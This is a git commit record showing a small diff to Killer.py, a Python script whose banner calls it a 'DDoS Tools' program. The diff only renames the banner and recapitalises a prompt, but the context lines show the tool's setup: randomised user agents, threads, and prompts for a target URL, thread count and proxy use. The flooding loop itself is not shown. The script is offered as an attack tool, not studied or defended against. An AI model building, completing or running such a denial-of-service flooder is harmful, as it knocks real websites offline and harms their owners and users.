9ba4e564d4a261280ac1e293ab778d92f4255ddf
ANKEALcode <66841428+ankealcode@users.noreply.github.com>
2023-11-03 04:28:26 +0800

    Update Killer.py

--- Killer.py
+++ Killer.py
@@ -1,4 +1,4 @@
-print("KILLNET DDoS by ANKEALcoder")
+print("KILLER_NET DDoS Tools by ANKEALcoder")
 from user import users #user - Nama file user.py (harus di dalam folder yang sama dengan skrip) user.py = nama variabel Anda dengan agen.
 import requests
 from threading import Thread
@@ -9,7 +9,7 @@ headers = {
         'User-Agent' : random.choice(users)
 }
 
-url = input("url: ")
+url = input("URL: ")
 threads = int(input("Threads: "))
 global choice
 choice = input('proxy: ')
